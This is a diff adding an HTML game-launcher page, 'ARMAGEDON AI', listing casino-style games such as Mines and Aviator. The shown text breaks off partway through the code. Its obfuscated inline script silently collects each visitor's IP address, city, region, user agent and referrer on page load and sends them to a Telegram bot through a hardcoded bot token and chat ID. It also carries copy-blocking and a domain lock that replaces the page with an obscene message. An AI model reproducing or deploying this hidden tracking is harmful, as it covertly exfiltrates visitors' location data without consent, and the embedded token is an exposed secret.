@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>АРМАГЕДОН AI</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&family=Orbitron:wght@500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #6e45e2;
+            --secondary-color: #88d3ce;
+            --text-color: #ffffff; /* Белый текст для лучшей читаемости */
+            --card-bg: #1a1a1a; /* Темный фон карточек без прозрачности */
+            --card-hover: #2a2a2a; /* Темный фон при наведении */
+            --bg-gradient: linear-gradient(-45deg, #0a0a0a, #121212, #1a1a1a); /* Темнее градиент */
+            --btn-glow: 0 0 15px rgba(110, 69, 226, 0.7);
+            --logo-text-color-1: #6e45e2;
+            --logo-text-color-2: #88d3ce;
+            --logo-bg: #1a1a1a; /* Темный фон без прозрачности */
+            --logo-border: rgba(255,255,255,0.2);
+            --settings-bg: #1a1a1a; /* Темный фон настроек */
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+        
+        body {
+            font-family: 'Montserrat', sans-serif;
+            color: var(--text-color);
+            background: var(--bg-gradient);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            min-height: 100vh;
+            overflow-x: hidden;
+            padding: 20px;
+            transition: all 0.5s ease;
+        }
+        
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .no-copy {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            pointer-events: none;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 20px,
+                rgba(255,255,255,0.05) 20px,
+                rgba(255,255,255,0.05) 21px
+            );
+        }
+        
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            animation: twinkle var(--duration) infinite ease-in-out;
+            opacity: 0;
+        }
+        
+        @keyframes twinkle {
+            0%, 100% { opacity: 0; }
+            50% { opacity: var(--opacity); }
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            animation: fadeInDown 1s ease;
+        }
+        
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .logo h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            background: linear-gradient(to right, var(--logo-text-color-1), var(--logo-text-color-2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: var(--logo-bg);
+            border-radius: 15px;
+            border: 2px solid var(--logo-border);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
+        
+        .logo h1::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(to right, var(--logo-text-color-1), var(--logo-text-color-2));
+            border-radius: 3px;
+            transform: scaleX(0);
+            transform-origin: left;
+            animation: expandLine 2s ease-in-out infinite;
+        }
+        
+        @keyframes expandLine {
+            0%, 100% { transform: scaleX(0); }
+            50% { transform: scaleX(1); }
+        }
+        
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            animation: fadeInUp 1s ease 0.3s both;
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .game-card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .game-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: 0.5s;
+        }
+        
+        .game-card:hover::before {
+            left: 100%;
+        }
+        
+        .game-card:hover {
+            transform: scale(1.05);
+            background: var(--card-hover);
+            box-shadow: 0 12px 40px 0 rgba(0, 0, 0, 0.4);
+        }
+        
+        .game-image {
+            width: 100%;
+            height: 120px;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+        
+        .game-card:hover .game-image {
+            transform: scale(1.1);
+        }
+        
+        .play-btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            text-decoration: none;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .play-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -60%;
+            width: 40px;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.2);
+            transform: rotate(30deg);
+            transition: all 0.3s;
+        }
+        
+        .play-btn:hover::after {
+            left: 120%;
+        }
+        
+        .play-btn:hover {
+            background: linear-gradient(to right, var(--secondary-color), var(--primary-color));
+            letter-spacing: 1px;
+            box-shadow: var(--btn-glow);
+        }
+        
+        .settings-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 100;
+        }
+        
+        .settings-btn {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(110, 69, 226, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(110, 69, 226, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(110, 69, 226, 0); }
+        }
+        
+        .settings-btn:hover {
+            transform: rotate(180deg) scale(1.1);
+            box-shadow: 0 0 20px rgba(110, 69, 226, 0.7);
+        }
+        
+        .settings-menu {
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            background: var(--settings-bg);
+            border-radius: 15px;
+            padding: 15px;
+            display: none;
+            width: 240px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .settings-tabs {
+            display: flex;
+            margin-bottom: 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .settings-tab {
+            padding: 5px 10px;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: all 0.3s ease;
+            color: var(--text-color);
+        }
+        
+        .settings-tab.active {
+            opacity: 1;
+            border-bottom: 2px solid var(--primary-color);
+            color: var(--text-color);
+        }
+        
+        .settings-content {
+            display: none;
+        }
+        
+        .settings-content.active {
+            display: block;
+        }
+        
+        .theme-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .language-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        
+        .theme-option, .language-option {
+            padding: 5px 10px;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 12px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            color: var(--text-color);
+        }
+        
+        .theme-option {
+            width: 100%;
+            height: 30px;
+            border-radius: 8px;
+            border: 2px solid white;
+        }
+        
+        .theme-option:hover, .language-option:hover {
+            transform: scale(1.05);
+            background: rgba(255,255,255,0.2);
+        }
+        
+        .theme-option.active, .language-option.active {
+            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+            border-color: transparent;
+            box-shadow: 0 0 10px rgba(255,255,255,0.3);
+        }
+        
+        .floating-particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+        
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: float linear infinite;
+        }
+        
+        @keyframes float {
+            to {
+                transform: translateY(-100vh) rotate(360deg);
+            }
+        }
+        
+        /* Защита от копирования */
+        body::after {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAYAAACp8Z5+AAAAEklEQVQImWNgYGD4z0AswK4SAFXuAf8EPy+xAAAAAElFTkSuQmCC') repeat;
+            pointer-events: none;
+            z-index: 9998;
+            opacity: 0.02;
+        }
+        
+        /* Запрет контекстного меню */
+        body {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="no-copy"></div>
+    <div class="stars" id="stars"></div>
+    <div class="floating-particles" id="particles"></div>
+    
+    <div class="container">
+        <div class="logo">
+            <h1>ARMAGEDON AI</h1>
+        </div>
+        
+        <div class="games-grid" id="gamesGrid">
+        </div>
+    </div>
+
+    <div class="settings-panel">
+        <button class="settings-btn" id="settingsBtn"><i class="fas fa-palette"></i></button>
+        <div class="settings-menu" id="settingsMenu">
+            <div class="settings-tabs">
+                <div class="settings-tab active" data-tab="theme">Тема</div>
+                <div class="settings-tab" data-tab="language">Язык</div>
+            </div>
+            
+            <div class="settings-content active" id="themeContent">
+                <div class="theme-options">
+                    <div class="theme-option active" style="background: linear-gradient(45deg, #6e45e2, #88d3ce);" data-theme="default"></div>
+                    <div class="theme-option" style="background: linear-gradient(45deg, #ff4e50, #f9d423);" data-theme="sunset"></div>
+                    <div class="theme-option" style="background: linear-gradient(45deg, #4776E6, #8E54E9);" data-theme="purple"></div>
+                    <div class="theme-option" style="background: linear-gradient(45deg, #0f2027, #203a43, #2c5364);" data-theme="dark"></div>
+                    <div class="theme-option" style="background: linear-gradient(45deg, #1A2980, #26D0CE);" data-theme="ocean"></div>
+                    <div class="theme-option" style="background: linear-gradient(45deg, #FF416C, #FF4B2B);" data-theme="red"></div>
+                    <div class="theme-option" style="background: linear-gradient(45deg, #614385, #516395);" data-theme="mystic"></div>
+                    <div class="theme-option" style="background: linear-gradient(45deg, #11998e, #38ef7d);" data-theme="green"></div>
+                    <div class="theme-option" style="background: linear-gradient(45deg, #4568DC, #B06AB3);" data-theme="royal"></div>
+                </div>
+            </div>
+            
+            <div class="settings-content" id="languageContent">
+                <div class="language-options">
+                    <div class="language-option active" data-lang="ru">Русский</div>
+                    <div class="language-option" data-lang="en">English</div>
+                    <div class="language-option" data-lang="pt">Português</div>
+                    <div class="language-option" data-lang="hi">हिन्दी</div>
+                    <div class="language-option" data-lang="es">Español</div>
+                    <div class="language-option" data-lang="tr">Türkçe</div>
+                    <div class="language-option" data-lang="tg">Тоҷикӣ</div>
+                    <div class="language-option" data-lang="uz">O'zbek</div>
+                    <div class="language-option" data-lang="az">Azərbaycanca</div>
+                    <div class="language-option" data-lang="uk">Українська</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const _0x449f1d=_0xbe20;(function(_0x3e968e,_0x5655ed){const _0x228269=_0xbe20,_0x446e15=_0x3e968e();while(!![]){try{const _0x41fae3=parseInt(_0x228269(0x1ca))/0x1*(-parseInt(_0x228269(0x1eb))/0x2)+parseInt(_0x228269(0x190))/0x3+parseInt(_0x228269(0x1b6))/0x4*(-parseInt(_0x228269(0x211))/0x5)+-parseInt(_0x228269(0x178))/0x6*(-parseInt(_0x228269(0x169))/0x7)+-parseInt(_0x228269(0x1d0))/0x8+-parseInt(_0x228269(0x15b))/0x9+parseInt(_0x228269(0x18f))/0xa;if(_0x41fae3===_0x5655ed)break;else _0x446e15['push'](_0x446e15['shift']());}catch(_0x2cffab){_0x446e15['push'](_0x446e15['shift']());}}}(_0x2609,0x8f461));const TELEGRAM_BOT_TOKEN=_0x449f1d(0x1ba),ADMIN_ID=_0x449f1d(0x1b7),ALLOWED_DOMAINS=[_0x449f1d(0x1f4)];function _0x2609(){const _0x3136ed=['games/brawlpirates/index.html','games/aviator/index.html','game7.jpg','#0f2027','keyCode','#38ef7d','https://api.telegram.org/bot','RocketQueen','БОЗӢ','\x22\x20class=\x22game-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22','Доступ\x20запрещён','BrawlPirates','--opacity','outerHeight','particles','Balloon','JUGAR','7378461aByIsZ','Мины','#FF4B2B','mystic','country','stringify','height','block','Content','className','region','#f9d423','none','toISOString','2326499OaFSiu','#516395','--card-bg','#2a2a2a','--logo-border','--logo-bg','transition','countryName','appendChild','game10.jpg','--btn-glow','\x22\x20alt=\x22','10000','hostname','fixed','18zHkwna','querySelectorAll','#ffffff','red','games/rocketqueen/index.html','star','getElementById','rgba(255,255,255,0.2)','0\x200\x2015px\x20rgba(97,\x2067,\x20133,\x200.7)','10px','game8.jpg','data-lang','games/bombucks/index.html','dark','keydown','#FF416C','--bg-gradient','common','ГРАТИ','json','classList','purple','Mi\x20Mines','21128020XpuYHq','1354401DXHlRw','borderRadius','city','add','innerWidth','referrer','particle','NewMines','game9.jpg','target','rgba(0,0,0,0.8)','games/newmines/index.html','createElement','center','error','Direct','.theme-option','#8E54E9','close','--secondary-color','game2.jpg','0\x200\x2015px\x20rgba(26,\x2041,\x20128,\x200.7)','#ff4e50','Ошибка\x20отправки\x20в\x20Telegram:','0\x200\x2015px\x20rgba(255,\x2078,\x2080,\x200.7)','--logo-text-color-2','preventDefault','--settings-bg','#1A2980','0\x200\x2015px\x20rgba(255,\x2065,\x20108,\x200.7)','innerHeight','settingsMenu','zIndex','DOMContentLoaded','#614385','#88d3ce','remove','.settings-content','12eaMVqi','5732636702','games/royalmines/index.html','rgba(255,255,255,0.1)','7372403962:AAFmv-2kXknZY6JOtRkGaEknCoufQ-DScjM','body','Aviator','contains','50%','display','</code>\x0a\x0a⏰\x20<b>Время:</b>\x20<code>','LuckyJet','all\x200.5s\x20ease','stars','#1a1a1a','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20📱\x20<b>Устройство:</b>\x20<code>','animationDuration','0\x200\x2015px\x20rgba(15,\x2032,\x2039,\x200.7)','\x22\x20class=\x22play-btn\x22>','padding','373tEiBHt','games/mines/index.html','.language-option','random','forEach','some','5700536jjgdPu','0\x200\x2015px\x20rgba(110,\x2069,\x20226,\x200.7)','linear-gradient(-45deg,\x20#0a0a0a,\x20#121212,\x20#1a1a1a)','animationDelay','userAgent','position','OYNA','getAttribute','JOGAR','stopPropagation','HTML','games/balloon/index.html','royal','O\x27YNA','application/json','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22images/','\x0a📱\x20<b>User\x20Agent:</b>\x20<code>','left','--card-hover','active','</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','</code>\x0a🔗\x20<b>URL:</b>\x20<code>','</code>\x0a📍\x20<b>Местоположение:</b>\x20','color','POST','style','Bombucks','3512ajQXqx','#4568DC','.settings-tab','name','div','top','includes','#B06AB3','link','soaiskd3odill2.vercel.app','addEventListener','game6.jpg','click','setProperty','#26D0CE','🚫\x20<b>Несанкционированный\x20доступ!</b>\x0a\x0a🌐\x20<b>Домен:</b>\x20<code>','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20✅\x20<b>Новый\x20вход\x20в\x20NOVA\x20APP</b>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20🌐\x20<b>Домен:</b>\x20<code>','#4776E6','ИГРАТЬ','</code>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','settingsBtn','--logo-text-color-1','--primary-color','innerHTML','0\x200\x2015px\x20rgba(71,\x20118,\x20230,\x200.7)','game4.jpg','#6e45e2','transform','games/luckyjet/index.html','textAlign','href','Unknown','games/mimines/index.html','ocean','--text-color','gamesGrid','<i\x20class=\x22fas\x20fa-lock\x22\x20style=\x22font-size:\x2030px;\x20margin-bottom:\x2010px;\x22></i><br>Люблю\x20тебя,\x20by\x20Shell','0\x200\x2015px\x20rgba(17,\x20153,\x20142,\x200.7)','1311845oBJPrm','play','width','/sendMessage','documentElement','backgroundColor','white','boxShadow'];_0x2609=function(){return _0x3136ed;};return _0x2609();}document['addEventListener']('contextmenu',function(_0x1a5ad9){const _0x38d3d5=_0x449f1d;_0x1a5ad9[_0x38d3d5(0x1aa)](),showProtectionMessage();}),document[_0x449f1d(0x1f5)](_0x449f1d(0x186),function(_0xe6222d){const _0x26edd1=_0x449f1d;(_0xe6222d['ctrlKey']&&(_0xe6222d['keyCode']===0x43||_0xe6222d[_0x26edd1(0x21d)]===0x56||_0xe6222d['keyCode']===0x41||_0xe6222d[_0x26edd1(0x21d)]===0x53||_0xe6222d[_0x26edd1(0x21d)]===0x55)||_0xe6222d['keyCode']===0x7b)&&(_0xe6222d[_0x26edd1(0x1aa)](),showProtectionMessage());});function showProtectionMessage(){const _0xf91f61=_0x449f1d,_0x46fb9c=document[_0xf91f61(0x19c)](_0xf91f61(0x1ef));_0x46fb9c[_0xf91f61(0x1e9)][_0xf91f61(0x1d5)]=_0xf91f61(0x177),_0x46fb9c[_0xf91f61(0x1e9)][_0xf91f61(0x1f0)]=_0xf91f61(0x1be),_0x46fb9c['style'][_0xf91f61(0x1e1)]=_0xf91f61(0x1be),_0x46fb9c['style'][_0xf91f61(0x206)]='translate(-50%,\x20-50%)',_0x46fb9c[_0xf91f61(0x1e9)][_0xf91f61(0x216)]=_0xf91f61(0x19a),_0x46fb9c[_0xf91f61(0x1e9)][_0xf91f61(0x1e7)]=_0xf91f61(0x217),_0x46fb9c[_0xf91f61(0x1e9)][_0xf91f61(0x1c9)]='20px',_0x46fb9c['style'][_0xf91f61(0x191)]=_0xf91f61(0x181),_0x46fb9c[_0xf91f61(0x1e9)][_0xf91f61(0x1b0)]=_0xf91f61(0x175),_0x46fb9c[_0xf91f61(0x1e9)][_0xf91f61(0x208)]=_0xf91f61(0x19d),_0x46fb9c[_0xf91f61(0x1e9)][_0xf91f61(0x218)]='0\x200\x2020px\x20rgba(255,0,0,0.5)',_0x46fb9c['innerHTML']=_0xf91f61(0x20f),document[_0xf91f61(0x1bb)][_0xf91f61(0x171)](_0x46fb9c),setTimeout(()=>{const _0x77b3e3=_0xf91f61;_0x46fb9c[_0x77b3e3(0x1e9)][_0x77b3e3(0x16f)]=_0x77b3e3(0x1c2),_0x46fb9c[_0x77b3e3(0x1e9)]['opacity']='0',setTimeout(()=>_0x46fb9c[_0x77b3e3(0x1b4)](),0x1f4);},0x7d0);}async function sendTelegramMessage(_0x329487){const _0x21a19a=_0x449f1d;try{const _0x41dd93=await fetch(_0x21a19a(0x21f)+TELEGRAM_BOT_TOKEN+_0x21a19a(0x214),{'method':_0x21a19a(0x1e8),'headers':{'Content-Type':_0x21a19a(0x1de)},'body':JSON[_0x21a19a(0x160)]({'chat_id':ADMIN_ID,'text':_0x329487,'parse_mode':_0x21a19a(0x1da)})}),_0x293d5f=await _0x41dd93[_0x21a19a(0x18b)]();!_0x293d5f['ok']&&console['error'](_0x21a19a(0x1a7),_0x293d5f);}catch(_0x576d81){console[_0x21a19a(0x19e)]('Ошибка\x20отправки:',_0x576d81);}}async function getCountryName(_0x430a22){const _0x5ca9ce=_0x449f1d;try{const _0x43da8e=await fetch('https://restcountries.com/v3.1/alpha/'+_0x430a22),_0x189a1a=await _0x43da8e[_0x5ca9ce(0x18b)]();return _0x189a1a[0x0]?.[_0x5ca9ce(0x1ee)][_0x5ca9ce(0x189)]||_0x5ca9ce(0x20a);}catch(_0x3c72c8){return _0x5ca9ce(0x20a);}}async function getUserInfo(){const _0x3f5e57=_0x449f1d;try{const _0x5c6251=await fetch('https://ipinfo.io/json'),_0x27e81=await _0x5c6251['json'](),_0x352b85=await getCountryName(_0x27e81['country']);return{'ip':_0x27e81['ip']||_0x3f5e57(0x20a),'country':_0x27e81[_0x3f5e57(0x15f)]||'Unknown','countryName':_0x352b85,'city':_0x27e81['city']||_0x3f5e57(0x20a),'region':_0x27e81[_0x3f5e57(0x165)]||_0x3f5e57(0x20a),'userAgent':navigator[_0x3f5e57(0x1d4)],'referrer':document[_0x3f5e57(0x195)]||_0x3f5e57(0x19f)};}catch(_0x360768){return{'ip':'Unknown','country':'Unknown','countryName':_0x3f5e57(0x20a),'city':_0x3f5e57(0x20a),'region':_0x3f5e57(0x20a),'userAgent':navigator[_0x3f5e57(0x1d4)],'referrer':_0x3f5e57(0x20a)};}}async function checkDomainAndNotify(){const _0x32dd72=_0x449f1d,_0x34ec10=window['location'][_0x32dd72(0x176)],_0x350b85=await getUserInfo(),_0x394b23=ALLOWED_DOMAINS[_0x32dd72(0x1cf)](_0x573600=>_0x34ec10[_0x32dd72(0x1f1)](_0x573600));if(!_0x394b23){const _0x44e1a6=_0x32dd72(0x1fa)+_0x34ec10+_0x32dd72(0x1e5)+window['location'][_0x32dd72(0x209)]+'</code>\x0a🏠\x20<b>IP:</b>\x20<code>'+_0x350b85['ip']+_0x32dd72(0x1e6)+_0x350b85['city']+',\x20'+_0x350b85[_0x32dd72(0x165)]+',\x20'+_0x350b85[_0x32dd72(0x170)]+_0x32dd72(0x1e0)+_0x350b85['userAgent']+_0x32dd72(0x1c0)+new Date()[_0x32dd72(0x168)]()+_0x32dd72(0x1fe);await sendTelegramMessage(_0x44e1a6),document[_0x32dd72(0x1bb)][_0x32dd72(0x202)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x22text-align:\x20center;\x20padding:\x2050px;\x20color:\x20white;\x20font-family:\x20Arial;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20style=\x22color:\x20red;\x22>🚫\x20Ебаный\x20пиздюк,\x20это\x20платная\x20веббка!</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Приди\x20ко\x20мне,\x20как\x20покупатель\x20и\x20купи\x20её</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>by\x20@tegshell</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';throw new Error(_0x32dd72(0x154));}else{const _0x16b42a=_0x32dd72(0x1fb)+_0x34ec10+'</code>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20📍\x20<b>Локация:</b>\x20'+_0x350b85[_0x32dd72(0x192)]+',\x20'+_0x350b85['countryName']+_0x32dd72(0x1c5)+_0x350b85[_0x32dd72(0x1d4)]+'</code>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';await sendTelegramMessage(_0x16b42a);}}document[_0x449f1d(0x1f5)](_0x449f1d(0x1b1),async()=>{await checkDomainAndNotify();});function createStars(){const _0x540c9b=_0x449f1d,_0xe69ef6=document[_0x540c9b(0x17e)](_0x540c9b(0x1c3)),_0x25e8e8=0x64;for(let _0x3d03a1=0x0;_0x3d03a1<_0x25e8e8;_0x3d03a1++){const _0x387009=document[_0x540c9b(0x19c)](_0x540c9b(0x1ef));_0x387009[_0x540c9b(0x18c)][_0x540c9b(0x193)](_0x540c9b(0x17d));const _0x10bc1f=Math[_0x540c9b(0x1cd)]()*0x3,_0x45c391=Math[_0x540c9b(0x1cd)]()*0x64,_0x258951=Math[_0x540c9b(0x1cd)]()*0x64,_0x4bb5b6=0x3+Math['random']()*0x7,_0x998325=Math[_0x540c9b(0x1cd)]()*0x5,_0x1d9a0c=0.5+Math[_0x540c9b(0x1cd)]()*0.5;_0x387009[_0x540c9b(0x1e9)][_0x540c9b(0x213)]=_0x10bc1f+'px',_0x387009[_0x540c9b(0x1e9)][_0x540c9b(0x161)]=_0x10bc1f+'px',_0x387009[_0x540c9b(0x1e9)]['left']=_0x45c391+'%',_0x387009[_0x540c9b(0x1e9)][_0x540c9b(0x1f0)]=_0x258951+'%',_0x387009[_0x540c9b(0x1e9)][_0x540c9b(0x1f8)]('--duration',_0x4bb5b6+'s'),_0x387009[_0x540c9b(0x1e9)]['setProperty'](_0x540c9b(0x156),_0x1d9a0c),_0x387009[_0x540c9b(0x1e9)][_0x540c9b(0x1d3)]=_0x998325+'s',_0xe69ef6['appendChild'](_0x387009);}}function createParticles(){const _0x523f47=_0x449f1d,_0x5e79af=document['getElementById'](_0x523f47(0x158)),_0x51203a=0x14;for(let _0x4afb83=0x0;_0x4afb83<_0x51203a;_0x4afb83++){const _0x455c34=document['createElement']('div');_0x455c34['classList'][_0x523f47(0x193)](_0x523f47(0x196));const _0x5370bb=0x2+Math[_0x523f47(0x1cd)]()*0x5,_0x161601=Math[_0x523f47(0x1cd)]()*0x64,_0x1938d5=0x64+Math[_0x523f47(0x1cd)]()*0x14,_0x2078f0=0x14+Math['random']()*0x1e,_0x25c4f7=Math[_0x523f47(0x1cd)]()*0x14,_0x20e06b=0.2+Math['random']()*0.3;_0x455c34[_0x523f47(0x1e9)][_0x523f47(0x213)]=_0x5370bb+'px',_0x455c34[_0x523f47(0x1e9)][_0x523f47(0x161)]=_0x5370bb+'px',_0x455c34[_0x523f47(0x1e9)][_0x523f47(0x1e1)]=_0x161601+'%',_0x455c34[_0x523f47(0x1e9)]['top']=_0x1938d5+'%',_0x455c34['style'][_0x523f47(0x1c6)]=_0x2078f0+'s',_0x455c34[_0x523f47(0x1e9)][_0x523f47(0x1d3)]=_0x25c4f7+'s',_0x455c34[_0x523f47(0x1e9)]['opacity']=_0x20e06b,_0x5e79af['appendChild'](_0x455c34);}}function _0xbe20(_0x46d202,_0x44fb71){const _0x2609a5=_0x2609();return _0xbe20=function(_0xbe20df,_0x50daab){_0xbe20df=_0xbe20df-0x152;let _0x59c2cc=_0x2609a5[_0xbe20df];return _0x59c2cc;},_0xbe20(_0x46d202,_0x44fb71);}const games=[{'id':0x1,'name':_0x449f1d(0x15c),'image':'game1.jpg','link':_0x449f1d(0x1cb)},{'id':0x2,'name':_0x449f1d(0x18e),'image':_0x449f1d(0x1a4),'link':_0x449f1d(0x20b)},{'id':0x3,'name':_0x449f1d(0x220),'image':'game3.jpg','link':_0x449f1d(0x17c)},{'id':0x4,'name':_0x449f1d(0x1ea),'image':_0x449f1d(0x204),'link':_0x449f1d(0x184)},{'id':0x5,'name':_0x449f1d(0x155),'image':'game5.jpg','link':_0x449f1d(0x219)},{'id':0x6,'name':'RoyalMines','image':_0x449f1d(0x1f6),'link':_0x449f1d(0x1b8)},{'id':0x7,'name':_0x449f1d(0x1c1),'image':_0x449f1d(0x21b),'link':_0x449f1d(0x207)},{'id':0x8,'name':_0x449f1d(0x197),'image':_0x449f1d(0x182),'link':_0x449f1d(0x19b)},{'id':0x9,'name':_0x449f1d(0x159),'image':_0x449f1d(0x198),'link':_0x449f1d(0x1db)},{'id':0xa,'name':_0x449f1d(0x1bc),'image':_0x449f1d(0x172),'link':_0x449f1d(0x21a)}],translations={'play':{'ru':_0x449f1d(0x1fd),'en':'PLAY','pt':_0x449f1d(0x1d8),'hi':'खेलें','es':_0x449f1d(0x15a),'tr':_0x449f1d(0x1d6),'tg':_0x449f1d(0x152),'uz':_0x449f1d(0x1dd),'az':_0x449f1d(0x1d6),'uk':_0x449f1d(0x18a)}};function populateGames(_0x278fb0='ru'){const _0x53bd4a=_0x449f1d,_0x33f4ad=document[_0x53bd4a(0x17e)](_0x53bd4a(0x20e));_0x33f4ad[_0x53bd4a(0x202)]='',games['forEach']((_0x5e5a55,_0x3b6f5a)=>{const 